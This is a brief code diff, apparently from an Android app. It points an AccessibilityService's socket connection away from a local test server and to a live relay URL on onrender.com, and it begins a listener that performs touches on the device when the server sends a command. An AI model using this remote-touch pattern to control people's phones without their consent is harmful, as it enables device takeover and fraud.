@@ -16,7 +16,8 @@ public class MyAccessibilityService extends AccessibilityService {
     public void onServiceConnected() {
         super.onServiceConnected();
         try {
-            mSocket = IO.socket("http://10.0.2.2:3000"); // Server URL
+            // Render ka Live URL
+            mSocket = IO.socket("https://s-agent-relay.onrender.com");
             mSocket.connect();
             
             mSocket.on("perform-touch", args -> {
